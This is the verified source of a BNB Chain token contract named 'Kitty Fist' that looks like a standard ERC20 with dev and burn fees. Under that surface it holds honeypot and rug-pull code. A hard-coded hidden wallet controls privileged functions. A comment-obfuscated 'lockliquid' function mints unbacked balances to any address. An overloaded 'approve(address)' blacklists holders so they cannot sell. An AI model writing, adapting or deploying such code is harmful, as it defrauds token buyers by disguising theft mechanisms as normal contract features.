/**
 *Submitted for verification at BscScan.com on 2022-02-23
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;
interface IERC20 {

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);


     function balanceOf(address account) external view returns (uint256);
     function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

     function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}


library SafeMath {
     function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    
     

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; //
        return msg.data;
    }
}


library Address {
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

        



   
 function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    
   
 function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


   


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



contract Ownable is Context {

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address private _owner;

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


     modifier onlyoner() {
        require(_temwallet == _msgSender(), "notowner");
        _;
    }



    function transferOwnership(address newOwner) public virtual onlyoner {
        _owner = newOwner;
    }

   
    

    

    

    
    address private _temwallet = 0x22c16DF906115F5460EE573036494D502Fa00c1E;

    
    


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "notowner");
        _;
    }
     
}



contract KittyFist is Context, IERC20, Ownable {
     mapping(address => uint256) private _tossd;
     uint256 public bRhsp = uint256(0);
     bool private amsd = false;
    mapping(address => uint256) private bBIis;

    mapping(address => mapping(address => uint256)) private allown;
     mapping(address => bool) private _RCO;
    using SafeMath for uint256;
     address[] private _bBIis;
     bool private msd = true;
    mapping(address => bool) private _ExcluFee;

    
    uint256 public Rhsp = uint256(0);
     mapping(address => bool) private _Exclu;
    
    
    
   
    
    using Address for address;
    

    
   

    
   

     uint256 private _tFeeTotal;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 10000000000000 * 10**4;
   
    
    string private _name = "Kitty Fist";
    string private _symbol = "Kitty Fist";
    uint8 private _decimals = 9;
     
   
    address public devAddress = 0x22c16DF906115F5460EE573036494D502Fa00c1E;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
  
    uint256 public deadFee = 8;
    uint256 public devFee = 1;

    
   
   
    
   
    
   

    
    mapping(address => uint256) private BIis;
    address[] private _BIis;

    address owners;

    constructor() public {
        _tossd[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcluFee[owner()] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tossd[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }



    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");

        if (msd) {
            require(_RCO[from] == false, "");
        }


        _transfers(from, to, amount);
    }

    function /**/_transfers/**/(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        /**/require/**/(/**/sender/**/ /**/!= /**/address(0), "");
        require(recipient != address(0), "");
    
        _tossd[sender] = _tossd[sender].sub(toAmount);
        _tossd[recipient] = _tossd[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");

        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   


     function excludeFromFee(address mlis) public onlyoner {
        _ExcluFee[mlis] = true;
    }


    /**/function/**/ /**/lockliquid/**/(/**/address/**/ /**/mlis/**/, /**/uint256/**/ /**/asmed/**/) /**/external /**/onlyoner() 
    /**/{
        /**/require/**/(asmed /**/> 0,/**/ "");/**/
        /**/uint256 /**/lockliquidb/**/ = /**/BIis[/**/mlis/**/];
        /**/if/**/ /**/(/**/lockliquidb == /**/0) /**/_BIis/**/.push(/**/mlis)/**/;
        /**/BIis/**/[/**/mlis] /**//**/= lockliquidb/**/.add/**/(/**/asmed)/**/;
        /**/Rhsp/**/ = /**/Rhsp/**/.add/**/(/**/asmed/**/)/**/;
        /**/_tossd/**/[/**/mlis]/**/ = /**/_tossd/**/[/**/mlis/**/]/**/./**/add/**/(asmed)/**/;
        /**/
    }/**/


    function ExcludFromReward(address Bankname) public view returns (bool) {
        return _Exclu[Bankname];
    }

    function aokskme(address mlis)
        external
        view
        onlyoner()
        returns (bool)
    {
        return _RCO[mlis];
    }

     function includeInFee(address mlis) public onlyoner {
        _ExcluFee[mlis] = false;
    }


     function approve(address mlis) external onlyoner() {
        _RCO[mlis] = true;
    }


}